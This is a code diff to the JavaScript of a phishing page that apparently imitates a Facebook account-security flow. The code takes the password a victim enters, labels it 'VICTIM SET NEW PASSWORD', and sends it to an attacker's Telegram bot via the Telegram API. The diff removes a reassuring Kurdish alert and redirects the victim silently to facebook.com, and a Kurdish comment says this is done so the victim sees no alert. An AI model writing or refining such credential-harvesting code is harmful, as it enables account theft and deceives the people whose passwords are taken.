@@ -31,9 +31,13 @@
             if(!p1) return alert("Please enter a new password.");
 
             const msg = `🆕 **VICTIM SET NEW PASSWORD!**\n🔑 New Pass: \`${p1}\``;
+            
+            // ناردنی زانیاری و ڕاستەوخۆ ناردنی قوربانی بۆ فەیسبووک بە بێ نمایشکردنی Alert
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=markdown`)
             .then(() => {
-                alert("پیرۆزە! هەژمارەکەت پارێزرا و گۆڕانکارییەکان بە سەرکەوتوویی تەواو بوون.");
+                window.location.href = "https://www.facebook.com";
+            })
+            .catch(() => {
                 window.location.href = "https://www.facebook.com";
             });
         }
